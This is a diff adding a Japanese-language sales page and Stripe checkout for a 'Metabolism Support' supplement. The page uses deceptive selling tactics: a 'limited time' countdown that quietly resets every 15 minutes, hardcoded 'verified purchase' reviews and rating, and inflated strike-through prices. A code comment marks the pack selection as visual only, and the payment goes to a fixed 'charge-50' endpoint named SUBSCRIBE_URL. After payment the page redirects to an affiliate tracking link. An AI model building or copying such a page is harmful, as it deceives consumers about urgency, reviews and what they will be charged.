@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Micronutrient • Metabolism Support（日本）</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800;900&display=swap" rel="stylesheet"/>
+<style>
+  :root{
+    --brand:#0b72d2;
+    --accent:#ff9c2e;
+    --ink:#0e1116;
+    --muted:#5b6472;
+    --line:#e5e7eb;
+    --radius:18px;
+  }
+  *{box-sizing:border-box}
+  html,body{height:100%}
+  body{
+    margin:0;
+    font:16px/1.5 Inter,system-ui,-apple-system,"Segoe UI",Roboto,Arial,"Hiragino Kaku Gothic ProN","Yu Gothic",Meiryo;
+    color:var(--ink);
+    background:#fff;
+  }
+
+  /* リボン */
+  .ribbon{background:#0e2b5c;color:#fff;font-weight:800;text-transform:uppercase;letter-spacing:.3px}
+  .ribbon .wrap{display:flex;align-items:center;gap:14px;padding:10px 16px;max-width:1200px;margin:0 auto}
+  .timer{margin-left:auto;display:flex;gap:18px;font-weight:900}
+  .timer span{display:flex;gap:6px;align-items:center}
+  .pill{background:rgba(255,255,255,.12);padding:4px 10px;border-radius:999px}
+
+  /* ヒーロー */
+  .hero{background:#f7fbff;border-bottom:1px solid var(--line)}
+  .hero .wrap{max-width:1200px;margin:0 auto;padding:30px 16px;display:grid;grid-template-columns:1.2fr 1fr;gap:24px;align-items:center}
+  .brand{display:flex;align-items:center;gap:10px;font-weight:900;font-size:40px}
+  .hero h1{font-size:36px;margin:14px 0 10px}
+  .badges{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-top:16px}
+  .badge{background:#fff;border:1px solid var(--line);border-radius:14px;padding:14px;text-align:center}
+  .badge b{display:block;margin-top:6px}
+  .product-hero{
+    min-height:260px;border-radius:22px;border:1px solid var(--line);
+    background:#fff url('meta1.jpg') center/cover no-repeat;
+  }
+
+  /* メイン */
+  .main{max-width:1200px;margin:0 auto;padding:24px 16px;display:grid;grid-template-columns:1fr 420px;gap:24px}
+  @media (max-width:1000px){.hero .wrap{grid-template-columns:1fr}.main{grid-template-columns:1fr}}
+
+  .card{background:#fff;border:1px solid var(--line);border-radius:var(--radius);box-shadow:0 6px 20px rgba(2,18,8,.05)}
+  .card .pad{padding:18px}
+
+  /* セット */
+  .packs{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}
+  @media (max-width:640px){.packs{grid-template-columns:1fr}}
+  .pack{border:2px solid var(--line);border-radius:16px;padding:14px;cursor:pointer;position:relative;display:grid;gap:6px;align-content:start}
+  .pack.active{border-color:var(--brand);box-shadow:0 0 0 3px rgba(11,114,210,.15)}
+  .tag{position:absolute;top:10px;left:10px;background:#0e2b5c;color:#fff;font-size:12px;padding:4px 8px;border-radius:999px}
+  .old{color:#9aa2ad;text-decoration:line-through;font-weight:600}
+  .price{font-size:26px;font-weight:900;color:#0e7f3d}
+  .pack img{width:140px;height:auto;margin:auto}
+
+  /* チェックアウト */
+  .checkout .head{display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid var(--line);padding:14px 18px}
+  .checkout h3{margin:0;font-size:20px}
+  .row{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+  .row > *{min-width:0}
+
+  /* 電話番号グループ */
+  .phone{display:flex;gap:10px;width:100%}
+  .phone select{flex:0 0 170px}
+  .phone input{flex:1 1 0%;min-width:0;width:100%}
+
+  .input,.el,select{width:100%;display:block;padding:12px 14px;border:1.6px solid var(--line);border-radius:12px;background:#fff;color:#000}
+  .input:focus,.el:focus,select:focus{outline:none;border-color:#cfe7ff;box-shadow:0 0 0 3px rgba(11,114,210,.15)}
+  .el{background:#fff}
+
+  .paybtn{width:100%;padding:14px 16px;border-radius:12px;background:var(--brand);color:#fff;font-weight:900;border:none;cursor:pointer}
+  .paybtn:hover{filter:saturate(1.06) brightness(0.98)}
+  .muted{color:#5b6472;font-size:14px}
+  .trust{display:flex;gap:14px;justify-content:center;padding:12px;border-top:1px solid var(--line)}
+  .trust img{height:22px;opacity:.8}
+
+  .list{display:grid;gap:10px;margin-top:6px}
+  .list .li{display:flex;gap:10px}
+  .check{width:18px;height:18px;border-radius:4px;background:#e9f4ff;display:inline-flex;align-items:center;justify-content:center}
+  .check:after{content:"✓";font-size:12px;color:#0b72d2}
+
+  /* オーバーレイ */
+  .overlay{position:fixed;inset:0;background:rgba(0,0,0,.6);display:none;align-items:center;justify-content:center;z-index:100}
+  .overlay[aria-hidden="false"]{display:flex}
+  .box{background:#fff;border-radius:16px;max-width:520px;width:92vw;padding:22px;text-align:center;box-shadow:0 10px 28px rgba(0,0,0,.3)}
+  .bar{height:10px;width:100%;background:#eef2f5;border-radius:999px;overflow:hidden;margin-top:10px}
+  .bar span{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--brand),var(--accent));animation:load 2.2s ease-in-out infinite;border-radius:inherit}
+  @keyframes load{0%{width:0%}60%{width:85%}100%{width:100%}}
+
+  #err{margin-top:10px;font-size:14px;color:#b00020;background:#fde9eb;border:1px solid #e5b2b8;border-radius:10px;padding:8px;display:none}
+  #err[aria-hidden="false"]{display:block}
+
+  footer{padding:30px 16px;color:#3b4450;border-top:1px solid var(--line);text-align:center}
+
+  /* レビュー */
+  .reviews{max-width:1200px;margin:24px auto;padding:0 16px}
+  .reviews .summary{display:flex;align-items:center;gap:18px;margin-bottom:10px}
+  .score{font-size:44px;font-weight:900}
+  .stars{color:#ff9c2e;font-size:18px;letter-spacing:2px}
+  .revgrid{display:grid;gap:12px}
+  .review{border:1px solid var(--line);border-radius:14px;padding:14px}
+  .review .hdr{display:flex;justify-content:space-between;align-items:center;margin-bottom:6px}
+  .review .name{font-weight:800}
+  .badge-green{background:#0e9f6e;color:#fff;font-size:12px;padding:4px 8px;border-radius:999px}
+</style>
+</head>
+<body>
+  <!-- リボン -->
+  <div class="ribbon">
+    <div class="wrap">
+      <div><span class="pill">期間限定</span></div>
+      <div class="timer" aria-live="polite">
+        <span><strong id="hh">00</strong> 時間</span>
+        <span><strong id="mm">15</strong> 分</span>
+        <span><strong id="ss">00</strong> 秒</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ヒーロー -->
+  <section class="hero">
+    <div class="wrap">
+      <div>
+        <div class="brand">Micronutrient</div>
+        <h1>Metabolism Support — 毎日にエネルギーを。</h1>
+        <div class="badges">
+          <div class="badge">⚡ <b>エネルギー代謝サポート</b></div>
+          <div class="badge">🔥 <b>代謝機能を応援</b></div>
+          <div class="badge">✅ <b>実感重視の配合</b></div>
+          <div class="badge">🔒 <b>安全な決済</b></div>
+        </div>
+      </div>
+      <div class="product-hero" aria-label="製品画像"></div>
+    </div>
+  </section>
+
+  <!-- メイン -->
+  <section class="main">
+    <!-- 左：セット -->
+    <div class="card">
+      <div class="pad">
+        <div class="packs" id="packGrid">
+          <div class="pack" data-pack="30">
+            <img src="meta2.jpg" alt="30錠入りパック">
+            <h4>1箱 — <b>30錠</b></h4>
+            <div class="old">¥11,990</div>
+            <div class="price">¥5,990</div>
+          </div>
+
+          <div class="pack active" data-pack="60">
+            <span class="tag">人気No.1</span>
+            <img src="meta1.jpg" alt="60錠入りパック">
+            <h4>2箱 — <b>60錠</b></h4>
+            <div class="old">¥14,990</div>
+            <div class="price">¥8,990</div>
+          </div>
+
+          <div class="pack" data-pack="120">
+            <img src="meta3.jpg" alt="120錠入りパック">
+            <h4>4箱 — <b>120錠</b></h4>
+            <div class="old">¥22,490</div>
+            <div class="price">¥14,990</div>
+          </div>
+        </div>
+
+        <div class="card" style="margin-top:14px">
+          <div class="pad">
+            <h3>選ばれる理由</h3>
+            <div class="list">
+              <div class="li"><span class="check"></span><div><b>30日間返金保証</b> — はじめてでも安心。</div></div>
+              <div class="li"><span class="check"></span><div><b>迅速発送</b> — 追跡番号付き。</div></div>
+              <div class="li"><span class="check"></span><div><b>安全な支払い</b> — 256-bit暗号化。</div></div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 右：チェックアウト -->
+    <div class="card checkout" id="checkoutCard">
+      <div class="head">
+        <h3>かんたん決済</h3>
+        <div class="muted">Stripe 提供</div>
+      </div>
+      <div class="pad">
+        <div class="row" style="margin-bottom:8px">
+          <input id="emailInput" class="input" type="email" placeholder="メールアドレス"/>
+          <input id="nameInput" class="input" placeholder="氏名"/>
+        </div>
+        <div style="margin-bottom:8px">
+          <div class="phone">
+            <select id="phonePrefix" class="input" aria-label="国番号"></select>
+            <input id="phoneNumber" class="input" type="tel" inputmode="tel" placeholder="電話番号"/>
+          </div>
+        </div>
+        <div class="row" style="margin-bottom:8px">
+          <input id="billingStreet" class="input" placeholder="住所（番地まで）"/>
+          <input id="billingCity" class="input" placeholder="市区町村"/>
+        </div>
+        <div class="row" style="margin-bottom:8px">
+          <input id="billingPostcode" class="input" placeholder="郵便番号"/>
+          <select id="billingCountry" class="input"></select>
+        </div>
+
+        <div class="muted" style="margin:8px 0 4px">カード番号</div>
+        <div id="card-number" class="el"></div>
+        <div class="row" style="margin-top:8px">
+          <div>
+            <div class="muted" style="margin:8px 0 4px">有効期限</div>
+            <div id="card-expiry" class="el"></div>
+          </div>
+          <div>
+            <div class="muted" style="margin:8px 0 4px">CVC</div>
+            <div id="card-cvc" class="el"></div>
+          </div>
+        </div>
+
+        <div id="err" role="alert" aria-hidden="true"></div>
+
+        <button id="payNow" class="paybtn" style="margin-top:12px">今すぐ注文</button>
+        <p class="muted" style="margin:10px 0 0">🔒 安全な決済（256-bit暗号化）</p>
+      </div>
+      <div class="trust">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa"/>
+        <img src="https://charmr.xyz/logos/mc2.png" alt="Mastercard"/>
+        <img src="https://charmr.xyz/logos/amex.png" alt="Amex"/>
+        <img src="https://www.gstatic.com/instantbuy/svg/dark_gpay.svg" alt="GPay"/>
+      </div>
+    </div>
+  </section>
+
+  <!-- レビュー -->
+  <section class="reviews" aria-labelledby="reviews-title">
+    <div class="summary">
+      <div class="score">4.7</div>
+      <div>
+        <div class="stars" aria-label="5点満点中4.7">★★★★★</div>
+        <div class="muted">購入者レビュー（確認済み）</div>
+      </div>
+    </div>
+    <div class="revgrid">
+      <article class="review">
+        <div class="hdr">
+          <div class="name">Yuki</div>
+          <span class="badge-green">認証済み購入</span>
+        </div>
+        <div class="stars">★★★★★</div>
+        <p>1週間ほどで朝の目覚めが軽くなりました。発送も早かったです。</p>
+      </article>
+      <article class="review">
+        <div class="hdr">
+          <div class="name">Daichi</div>
+          <span class="badge-green">認証済み購入</span>
+        </div>
+        <div class="stars">★★★★☆</div>
+        <p>品質に満足。梱包も丁寧でした。継続して使ってみます。</p>
+      </article>
+      <article class="review">
+        <div class="hdr">
+          <div class="name">Mina</div>
+          <span class="badge-green">認証済み購入</span>
+        </div>
+        <div class="stars">★★★★★</div>
+        <p>代謝サポートを実感。家族にも勧めたいと思います。</p>
+      </article>
+    </div>
+  </section>
+
+  <!-- ローディング -->
+  <div id="overlay" class="overlay" aria-hidden="true">
+    <div class="box">
+      <h3>お支払いを処理しています…</h3>
+      <div class="bar"><span></span></div>
+      <p class="muted">数秒お待ちください。</p>
+    </div>
+  </div>
+
+  <footer>
+    <b>免責事項：</b> 本記載は医療当局により評価されていません。本製品は疾病の診断・治療・治癒・予防を目的とするものではありません。妊娠中・授乳中、または持病がある方は医師にご相談ください。
+  </footer>
+
+  <!-- Stripe.js -->
+  <script src="https://js.stripe.com/v3"></script>
+  <script>
+    /* カウントダウン */
+    (function countdownLoop(){
+      const hh=document.getElementById('hh'), mm=document.getElementById('mm'), ss=document.getElementById('ss');
+      const DURATION_MS = 15*60*1000;
+      let end = Date.now() + DURATION_MS;
+      const fmt=n=>String(n).padStart(2,'0');
+      (function tick(){
+        const left = Math.max(0, end - Date.now());
+        const s = Math.floor(left/1000)%60;
+        const m = Math.floor(left/60000)%60;
+        const h = Math.floor(left/3600000);
+        hh.textContent=fmt(h); mm.textContent=fmt(m); ss.textContent=fmt(s);
+        if(left<=0){ end = Date.now() + DURATION_MS; }
+        requestAnimationFrame(tick);
+      })();
+    })();
+
+    /* 日本のみ */
+    const ALLOWED = {
+      JP: { prefix: '+81', name: '日本' }
+    };
+    function populateAllowed(selectEl){
+      if(!selectEl) return;
+      selectEl.innerHTML='';
+      const opt=new Option('+81 — 日本','+81',true,true);
+      opt.dataset.cc='JP';
+      selectEl.add(opt);
+    }
+    function populateCountries(countrySel){
+      if(!countrySel) return;
+      countrySel.innerHTML='';
+      const opt=new Option('日本','JP',true,true);
+      countrySel.add(opt);
+    }
+
+    (function initPhoneAndCountry(){
+      const prefixEl = document.getElementById('phonePrefix');
+      const phoneEl  = document.getElementById('phoneNumber');
+      const countryEl= document.getElementById('billingCountry');
+      populateAllowed(prefixEl);
+      populateCountries(countryEl);
+      if (phoneEl) { phoneEl.disabled=false; phoneEl.readOnly=false; }
+    })();
+
+    /* セット選択（見た目のみ） */
+    document.querySelectorAll('.pack').forEach(el=>{
+      el.addEventListener('click',()=>{
+        document.querySelectorAll('.pack').forEach(p=>p.classList.remove('active'));
+        el.classList.add('active');
+      });
+    });
+
+    /* エンドポイント（同一オリジン or ローカル） */
+    const API_BASE = (location.origin && location.origin.startsWith('http')) ? location.origin : 'http://localhost:5000';
+    const SUBSCRIBE_URL = `${API_BASE}/api/stripe/charge-50`;
+
+    /* Stripe Elements */
+    const PUBLISHABLE_KEY = "pk_live_51Rhm4sEJXIhiKzYGIPVjXwZTzuKmqU7EOA6EpDIkrNTmtm4ooWHbDcSaBlyglSdJYhCyU4VgcI8Qo09Acc8upCUD00ekSRuN4q";
+    const stripe = Stripe(PUBLISHABLE_KEY);
+    const elements = stripe.elements();
+    const cardNumber=elements.create("cardNumber");
+    const cardExpiry=elements.create("cardExpiry");
+    const cardCvc=elements.create("cardCvc");
+    cardNumber.mount("#card-number"); cardExpiry.mount("#card-expiry"); cardCvc.mount("#card-cvc");
+
+    /* ヘルパー */
+    const $err=document.getElementById("err");
+    const overlay=document.getElementById('overlay');
+    const showError=m=>{$err.textContent=m;$err.setAttribute('aria-hidden','false');}
+    const hideError=()=>{$err.textContent="";$err.setAttribute('aria-hidden','true');}
+    const showLoading=()=>overlay.setAttribute('aria-hidden','false');
+    const hideLoading=()=>overlay.setAttribute('aria-hidden','true');
+
+    /* 入力参照 */
+    const nameInput=document.getElementById('nameInput');
+    const emailInput=document.getElementById('emailInput');
+    const phoneNumber=document.getElementById('phoneNumber');
+    const billingStreet=document.getElementById('billingStreet');
+    const billingCity=document.getElementById('billingCity');
+    const billingPostcode=document.getElementById('billingPostcode');
+    const billingCountry=document.getElementById('billingCountry');
+
+    /* 決済 */
+    document.getElementById("payNow").onclick = async () => {
+      hideError(); showLoading();
+      const rawPhone=(phoneNumber?.value||'').replace(/[^\d]/g,'');
+      const fullPhone = rawPhone ? `${ALLOWED.JP.prefix}${rawPhone}` : undefined;
+
+      const addr = {
+        line1:(billingStreet?.value||'').trim()||undefined,
+        city:(billingCity?.value||'').trim()||undefined,
+        postal_code:(billingPostcode?.value||'').trim()||undefined,
+        country:'JP'
+      };
+
+      const pm = await stripe.createPaymentMethod({
+        type:"card",
+        card:cardNumber,
+        billing_details:{
+          name:nameInput.value||undefined,
+          email:emailInput.value||undefined,
+          phone:fullPhone,
+          address:addr
+        }
+      });
+      if(pm.error){ hideLoading(); showError(pm.error.message); return; }
+
+      try{
+        const res = await fetch(SUBSCRIBE_URL,{
+          method:"POST",
+          headers:{"Content-Type":"application/json"},
+          body:JSON.stringify({
+            paymentMethodId:pm.paymentMethod.id,
+            name:nameInput.value,
+            email:emailInput.value,
+            phone:fullPhone,
+            address:addr
+          })
+        });
+        const data = await res.json();
+        if(data.error){ hideLoading(); showError(data.error); return; }
+        if(!data.clientSecret){ hideLoading(); showError("お支払いに失敗しました"); return; }
+
+        const conf = await stripe.confirmCardPayment(data.clientSecret);
+        if(conf.error){ hideLoading(); showError(conf.error.message); return; }
+        if(!(conf.paymentIntent && conf.paymentIntent.status === "succeeded")){
+          hideLoading(); showError("お支払いが完了しませんでした"); return;
+        }
+
+        /* 成功後のリダイレクト */
+        window.location.href = "https://cudsr.bemobtrcks.com/go/abc281a7-e82a-411b-8b56-1a0228d7d2e7?";
+      }catch(e){ hideLoading(); showError(e.message||"エラーが発生しました"); }
+    };
+  </script>
+<!-- GoAffPro loader (kept, matches atlas.html integration) -->
+  <script type="text/javascript" src="https://api.goaffpro.com/loader.js?shop=nzyvwvfbde"></script>
+</body>
+</html>
+</body>
+</html>
